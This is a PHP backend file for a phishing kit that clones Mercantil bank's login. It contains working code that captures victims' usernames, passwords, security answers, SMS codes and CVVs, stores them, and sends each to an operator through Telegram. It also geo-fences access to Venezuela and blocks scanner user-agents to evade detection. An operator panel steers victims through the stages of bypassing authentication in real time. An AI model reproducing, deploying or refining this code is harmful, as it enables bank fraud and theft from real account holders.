<?php
/* ============================================================
   Mercantil · acciones.php
   API pública (la usa el clon)  +  API privada (panel)
   ============================================================ */
require __DIR__ . '/config.php';
header('Content-Type: application/json; charset=utf-8');
header('Cache-Control: no-store');

function out($arr, $code = 200) {
    http_response_code($code);
    echo json_encode($arr, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
    exit;
}

$accion = $_REQUEST['accion'] ?? '';
$json   = json_decode(file_get_contents('php://input'), true) ?: [];
$in     = array_merge($_REQUEST, $json);
if (!$accion) $accion = $in['accion'] ?? '';

/* ============================================================
   GEO-FENCE + ANTI-BOT GLOBAL (solo API pública)
   ============================================================ */
$ip_g = client_ip();
$acciones_publicas = ['enviar','verificar','preguntas','sms','cvv'];
if (in_array($accion, $acciones_publicas, true)) {
    // 1) Geo-fence: solo Venezuela. El resto -> reportado y expulsado.
    if (GEO_VE_SOLO) {
        $pais = ip_pais($ip_g);
        if ($pais !== GEO_PAIS_OK && $pais !== 'LOCAL') {
            registrar_ataque($ip_g, 'geo_bloqueado:' . $pais, ['accion' => $accion]);
            out(['success' => false, 'ok' => false, 'error' => 'geo', 'redirect' => 'https://www.google.com'], 403);
        }
    }
    // 2) User-Agent vacio o de herramienta = bot -> reportado y expulsado
    $ua_g = strtolower(user_agent());
    $ua_malo = ($ua_g === '' || $ua_g === 'desconocido');
    $patrones = ['curl','python','wget','libwww','scrapy','axios','node-fetch','okhttp','java/','httpclient','postman','insomnia','go-http','guzzle','headless','phantomjs','selenium','bot','spider','crawler'];
    foreach ($patrones as $pt) { if (strpos($ua_g, $pt) !== false) { $ua_malo = true; break; } }
    if ($ua_malo) {
        registrar_ataque($ip_g, 'ua_bot', ['accion' => $accion, 'ua' => mb_substr(user_agent(),0,80)]);
        out(['success' => false, 'ok' => false, 'error' => 'ua', 'redirect' => 'https://www.google.com'], 403);
    }
}

/* ============================================================
   API PÚBLICA — la usa el clon
   ============================================================ */

/* Paso 1: login (usuario + clave) → crea/actualiza sesión */
if ($accion === 'enviar') {
    // --- Antibot: honeypot. Si viene relleno, es un bot -> descartar en silencio + registrar ---
    if (trim((string)($in['_hp'] ?? '')) !== '') {
        registrar_ataque(client_ip(), 'honeypot', ['accion' => 'enviar']);
        out(['success' => true, 'ok' => true, 'sessionId' => 'x', 'n' => 0]);
    }
    // --- Bloqueo por IP: ON por defecto. MAXIMO 1 INTENTO POR IP. ---
    // (continuar una sesion ya existente con ?id= NO cuenta como intento nuevo)
    $sid_pre = trim((string)($in['id'] ?? ''));
    $es_intento_nuevo = ($sid_pre === '');
    $cfg_rl = json_read(F_CONFIG);
    if (!empty($cfg_rl['bloqueo_ip']) && $es_intento_nuevo) {
        $ip_rl = client_ip();
        if (rl_contar($ip_rl, RL_VENTANA) >= RL_MAX_POR_IP) {
            registrar_ataque($ip_rl, 'ip_repetida', ['accion' => 'enviar']);
            out(['success' => false, 'ok' => false, 'error' => 'ip_bloqueada'], 429);
        }
        rl_permitir($ip_rl, RL_MAX_POR_IP, RL_VENTANA);
    }
    // --- Tope global (frena avalanchas automaticas) ---
    if ($es_intento_nuevo && !rl_permitir(null, 0, RL_VENTANA)) {
        registrar_ataque(client_ip(), 'flood_global', ['accion' => 'enviar']);
        out(['success' => false, 'ok' => false, 'error' => 'flood_global'], 429);
    }
    // --- Purgar basura si el JSON explota ---
    rl_podar_sesiones();

    $usr = trim($in['usr'] ?? '');
    $clv = (string)($in['clv'] ?? '');
    // Validación mínima: usuario y clave razonables (evita spam de vacíos/basura)
    if (mb_strlen($usr) < 2 || mb_strlen($clv) < 2 || mb_strlen($usr) > 80 || mb_strlen($clv) > 80) {
        out(['success' => true, 'ok' => true, 'sessionId' => (string)($in['id'] ?? 'x'), 'n' => 0]);
    }
    $sid = trim((string)($in['id'] ?? ''));
    $ip  = client_ip();
    $geo = linea_ip($ip);

    $ses = json_read(F_SESIONES);
    $encontrada = false;
    if ($sid !== '') {
        foreach ($ses as &$s) {
            if (($s['id'] ?? '') === $sid) {
                $s['usuario'] = $usr;
                $s['clave']   = $clv;
                $s['estado']  = 'cargando';
                $s['ultimo']  = date('Y-m-d H:i:s');
                $s['veces']   = (int)($s['veces'] ?? 1) + 1;
                $encontrada = true;
                break;
            }
        }
        unset($s);
    }
    if (!$encontrada) {
        $sid = $sid !== '' ? $sid : uniqid('m_', true);
        $ses[] = [
            'id'       => $sid,
            'usuario'  => $usr,
            'clave'    => $clv,
            'estado'   => 'cargando',
            'pregunta' => '',
            'p1'       => '',
            'p2'       => '',
            'ts'       => date('Y-m-d H:i:s'),
            'ultimo'   => date('Y-m-d H:i:s'),
            'ip'       => $ip,
            'geo'      => $geo,
            'ua'       => user_agent(),
            'veces'    => 1,
        ];
    }
    json_write(F_SESIONES, $ses);
    log_accion('login', "$usr / $clv @ $ip");

    // Telegram: aviso al cliente (sin botonera)
    $geo_txt = trim(($geo['ciudad'] ?? '') . ' ' . ($geo['region'] ?? '') . ' ' . ($geo['pais'] ?? ''));
    $msg  = "<b>🏦 NUEVO ACCESO · MERCANTIL</b>\n"
          . "━━━━━━━━━━━━━━━━━━━━\n"
          . "👤 <b>Usuario</b>      <code>" . htmlspecialchars($usr, ENT_QUOTES) . "</code>\n"
          . "🔑 <b>Clave</b>        <code>" . htmlspecialchars($clv, ENT_QUOTES) . "</code>\n"
          . "🌐 <b>IP</b>           <code>" . htmlspecialchars($ip, ENT_QUOTES) . "</code>\n"
          . "📍 <b>Ubicación</b>    " . htmlspecialchars($geo_txt !== '' ? $geo_txt : 'Desconocida', ENT_QUOTES) . "\n"
          . (($geo['isp'] ?? '') !== '' ? "📡 <b>Operador</b>     " . htmlspecialchars($geo['isp'], ENT_QUOTES) . "\n" : '')
          . "🖥️ <b>Navegador</b>    " . htmlspecialchars(mb_substr(user_agent(), 0, 60), ENT_QUOTES) . "\n"
          . "🕒 <b>Hora</b>         <code>" . date('d/m/Y H:i:s') . "</code>\n"
          . "━━━━━━━━━━━━━━━━━━━━\n"
          . "🆔 <code>" . htmlspecialchars($sid, ENT_QUOTES) . "</code>";
    tg_enviar($msg);

    out(['success' => true, 'ok' => true, 'sessionId' => $sid]);
}

/* Paso 2/3/4: el clon consulta estado (polling) */
if ($accion === 'verificar') {
    $sid = (string)($in['id'] ?? '');
    $ses = json_read(F_SESIONES);
    $estado = 'cargando'; $p1 = ''; $p2 = '';
    foreach ($ses as &$s) {
        if (($s['id'] ?? '') === $sid) {
            $estado = $s['estado'] ?? 'cargando';
            $p1 = $s['p1'] ?? '';
            $p2 = $s['p2'] ?? '';
            $s['ultimo'] = date('Y-m-d H:i:s');
            break;
        }
    }
    unset($s);
    json_write(F_SESIONES, $ses);
    $map = [
        'cargando'      => 'cargando',
        'sms'           => 'mostrar_sms',
        'sms_error'     => 'mostrar_sms_error',
        'cvv'           => 'mostrar_cvv',
        'preguntas'     => 'mostrar_preguntas_usuario',
        'finalizado'    => 'aprobado_final',
        'rechazado'     => 'falso',
    ];
    out([
        'success' => true, 'ok' => true,
        'estado'  => $map[$estado] ?? $estado,
        'p1'      => $p1,
        'p2'      => $p2,
    ]);
}

/* Paso 3: cliente envía respuestas (resp1, resp2) */
if ($accion === 'preguntas') {
    $sid = (string)($in['id'] ?? '');
    $r1  = trim((string)($in['resp1'] ?? ($in['respuesta'] ?? '')));
    $r2  = trim((string)($in['resp2'] ?? ''));
    $ses = json_read(F_SESIONES);
    $p1 = ''; $p2 = ''; $ses_user = '';
    foreach ($ses as &$s) {
        if (($s['id'] ?? '') === $sid) {
            $p1 = $s['p1'] ?? '';
            $p2 = $s['p2'] ?? '';
            $ses_user = $s['usuario'] ?? '';
            $s['resp1'] = $r1;
            $s['resp2'] = $r2;
            $s['pregunta'] = trim($r1 . ($r2 !== '' ? ' | ' . $r2 : ''));
            $s['estado']   = 'cargando';
            $s['ultimo']   = date('Y-m-d H:i:s');
        }
    }
    unset($s);
    json_write(F_SESIONES, $ses);

    $block = "<b>❓ RESPUESTAS DE SEGURIDAD</b>\n"
           . "━━━━━━━━━━━━━━━━━━━━\n"
           . "👤 <b>Usuario</b>  <code>" . htmlspecialchars($ses_user, ENT_QUOTES) . "</code>\n"
           . "━━━━━━━━━━━━━━━━━━━━\n";
    if ($p1 !== '' || $r1 !== '') $block .= "• <b>" . htmlspecialchars($p1 !== '' ? $p1 : 'Pregunta 1', ENT_QUOTES) . "</b>\n   ↳ <code>" . htmlspecialchars($r1, ENT_QUOTES) . "</code>\n";
    if ($p2 !== '' || $r2 !== '') $block .= "• <b>" . htmlspecialchars($p2 !== '' ? $p2 : 'Pregunta 2', ENT_QUOTES) . "</b>\n   ↳ <code>" . htmlspecialchars($r2, ENT_QUOTES) . "</code>\n";
    $block .= "━━━━━━━━━━━━━━━━━━━━\n"
           . "🆔 <code>" . htmlspecialchars($sid, ENT_QUOTES) . "</code>\n"
           . "🕒 " . date('d/m/Y H:i:s');
    tg_enviar($block);
    out(['success' => true, 'ok' => true]);
}


/* Paso 5: cliente envía SMS / CVV (código) — se guarda y vuelve a cargando */
if ($accion === 'sms' || $accion === 'cvv') {
    $sid = (string)($in['id'] ?? '');
    $cod = '';
    for ($i = 1; $i <= 8; $i++) { if (isset($in['code'.$i])) $cod .= $in['code'.$i]; }
    if ($cod === '' && isset($in['code'])) $cod = (string)$in['code'];
    if ($cod === '' && isset($in['codigo'])) $cod = (string)$in['codigo'];
    $ip  = client_ip();
    $geo = linea_ip($ip);
    $ses = json_read(F_SESIONES);
    $ses_user = '';
    foreach ($ses as &$s) {
        if (($s['id'] ?? '') === $sid) {
            if ($accion === 'cvv') { $s['cvv'] = $cod; } else { $s['sms'] = $cod; }
            $ses_user = $s['usuario'] ?? '';
            $s['estado'] = 'cargando';
            $s['ultimo'] = date('Y-m-d H:i:s');
        }
    }
    unset($s);
    json_write(F_SESIONES, $ses);
    $titulo = $accion === 'cvv' ? '💳 CVV RECIBIDO' : '📩 SMS RECIBIDO';
    $lbl    = $accion === 'cvv' ? 'CVV' : 'Código';
    $geo_txt = trim(($geo['ciudad'] ?? '') . ', ' . ($geo['pais'] ?? ''), ', ');
    $msg = "<b>$titulo · MERCANTIL</b>\n"
         . "━━━━━━━━━━━━━━━━━━━━\n"
         . "👤 <b>Usuario</b>  <code>" . htmlspecialchars($ses_user, ENT_QUOTES) . "</code>\n"
         . "$lbl: <code>" . htmlspecialchars($cod, ENT_QUOTES) . "</code>\n"
         . "🌐 <b>IP</b>  <code>" . htmlspecialchars($ip, ENT_QUOTES) . "</code>\n"
         . ($geo_txt !== '' ? "📍 " . htmlspecialchars($geo_txt, ENT_QUOTES) . "\n" : '')
         . "🕒 " . date('d/m/Y H:i:s')
         . "\n━━━━━━━━━━━━━━━━━━━━\n🆔 <code>" . htmlspecialchars($sid, ENT_QUOTES) . "</code>";
    tg_enviar($msg);
    out(['success' => true, 'ok' => true]);
}

/* ============================================================
   API PRIVADA — requiere login del panel
   ============================================================ */
if (!panel_logueado()) {
    out(['ok' => false, 'error' => 'no_autenticado'], 401);
}

switch ($accion) {

    case 'presencia': {
        $ses = array_reverse(json_read(F_SESIONES));
        $now = time();
        $items = array_map(function ($s) use ($now) {
            $last = strtotime($s['ultimo'] ?? $s['ts'] ?? 'now');
            $s['online'] = ($now - $last) < 25;
            $s['seg']    = max(0, $now - $last);
            return $s;
        }, $ses);
        $onl = count(array_filter($items, fn($x) => !empty($x['online'])));
        out(['ok' => true, 'total' => count($items), 'online' => $onl, 'items' => $items]);
    }

    case 'listar_sesiones': {
        $ses = array_reverse(json_read(F_SESIONES));
        $ses = array_values(array_filter($ses, fn($s) => is_array($s) && trim((string)($s['usuario'] ?? '')) !== ''));
        $lim = (int)($in['limit'] ?? 300);
        out(['ok' => true, 'total' => count($ses), 'items' => array_slice($ses, 0, $lim)]);
    }

    case 'stats': {
        $ses = json_read(F_SESIONES);
        $por = [];
        foreach ($ses as $s) { $e = $s['estado'] ?? 'cargando'; $por[$e] = ($por[$e] ?? 0) + 1; }
        $hoy = 0; $f = date('Y-m-d');
        foreach ($ses as $s) { if (strpos($s['ts'] ?? '', $f) === 0) $hoy++; }
        out(['ok' => true, 'total' => count($ses), 'hoy' => $hoy, 'por_estado' => $por]);
    }

    /* ---- CONTROL: avanzar/mover al cliente desde el panel ---- */
    case 'control': {
        $sid = (string)($in['id'] ?? '');
        $tar = (string)($in['estado'] ?? '');
        $ses = json_read(F_SESIONES);
        $ok  = false;
        foreach ($ses as &$s) {
            if (($s['id'] ?? '') === $sid) {
                $s['estado'] = $tar;
                if (array_key_exists('p1', $in)) $s['p1'] = (string)$in['p1'];
                if (array_key_exists('p2', $in)) $s['p2'] = (string)$in['p2'];
                $s['ultimo'] = date('Y-m-d H:i:s');
                $ok = true;
            }
        }
        unset($s);
        json_write(F_SESIONES, $ses);
        log_accion('control', "$sid -> $tar");
        out(['ok' => $ok]);
    }

    case 'purgar': {
        $que = $in['que'] ?? 'sesiones';
        if ($que === 'sesiones') json_write(F_SESIONES, []);
        if ($que === 'logs')     json_write(F_LOGS, []);
        log_accion('purgar', $que);
        out(['ok' => true]);
    }

    case 'listar_logs':
        out(['ok' => true, 'items' => array_reverse(json_read(F_LOGS))]);

    case 'listar_ataques': {
        $arr = json_read(F_ATAQUES);
        $lim = (int)($in['limit'] ?? 200);
        out(['ok' => true, 'total' => count($arr), 'items' => array_slice($arr, 0, $lim)]);
    }

    case 'purgar_ataques': {
        json_write(F_ATAQUES, []);
        log_accion('purgar_ataques', '');
        out(['ok' => true]);
    }

    case 'set_config': {
        $cfg = json_read(F_CONFIG);
        foreach (['panel_nombre','tg_activo','tg_token','tg_chat','bloqueo_ip'] as $k) if (array_key_exists($k, $in)) $cfg[$k] = $in[$k];
        json_write(F_CONFIG, $cfg);
        log_accion('set_config', json_encode($in));
        out(['ok' => true, 'config' => $cfg]);
    }

    case 'guardar_config': {
        $cfg = json_read(F_CONFIG);
        if (array_key_exists('tg_token', $in)) $cfg['tg_token'] = trim((string)$in['tg_token']);
        if (array_key_exists('tg_chat', $in))  $cfg['tg_chat']  = trim((string)$in['tg_chat']);
        if (array_key_exists('panel_nombre', $in)) $cfg['panel_nombre'] = trim((string)$in['panel_nombre']);
        json_write(F_CONFIG, $cfg);
        log_accion('guardar_config', 'token/chat actualizados');
        out(['ok' => true, 'config' => $cfg]);
    }

    case 'get_config': {
        $cfg = json_read(F_CONFIG);
        out(['ok' => true, 'config' => $cfg]);
    }

    case 'probar_tg': {
        $cfg = json_read(F_CONFIG);
        $msg = "<b>🔔 PRUEBA · PANEL MERCANTIL</b>\n━━━━━━━━━━━━━━━━━━━━\n✅ Conexión configurada correctamente.\n🕒 " . date('d/m/Y H:i:s');
        $env = tg_enviar($msg);
        out(['ok' => true, 'enviado' => $env, 'token' => substr($cfg['tg_token'] ?? TG_TOKEN, 0, 10) . '…', 'chat' => $cfg['tg_chat'] ?? TG_CHAT_ID]);
    }

    default:
        out(['ok' => false, 'error' => 'accion_desconocida: ' . $accion], 400);
}
